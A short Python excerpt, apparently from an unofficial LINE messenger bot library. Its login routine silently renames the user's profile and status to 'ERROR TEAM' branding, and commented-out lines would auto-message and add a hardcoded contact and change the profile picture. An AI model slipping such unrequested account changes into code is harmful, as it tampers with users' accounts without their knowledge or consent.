...
class LineObject(object):
    ...
    def __init__(self):
        if self.isLogin == True:
            ...
            #puy = "u805e9f30ea4da7b64a14e0f9cea0767c"
            #tujuan = self.getContact(puy).displayName
            #self.chatTo("u805e9f30ea4da7b64a14e0f9cea0767c", 'Heii %s' % tujuan)
            profile = self.getProfile()
            profile.displayName = "È̶͟͏RR̡͜O̵͘͟͜Ŗ͟͏͠ T̶̨̢͠҉E̶̡̛͠Á̶͡͡M̀͢͠"
            self.updateProfile(profile)
            profile.statusMessage = "Rubbish in Hearts : È̶͟͏RR̡͜O̵͘͟͜Ŗ͟͏͠ T̶̨̢͠҉E̶̡̛͠Á̶͡͡M̀͢͠"
            self.updateProfile(profile)
            #DP = "https://4.bp.blogspot.com/-iWqSHjmXBdc/WsiI5hQUmJI/AAAAAAAAAOE/Hn_ekTVAASwvBBilrTyu9PJW1m6FaL7IgCLcBGAs/s1600/1515221909768.jpg"
            #LINE = self.downloadFileURL(DP)
            #self.updateProfilePicture(LINE)
            #PMID = "u805e9f30ea4da7b64a14e0f9cea0767c"
            #self.findAndAddContactsByMid(PMID)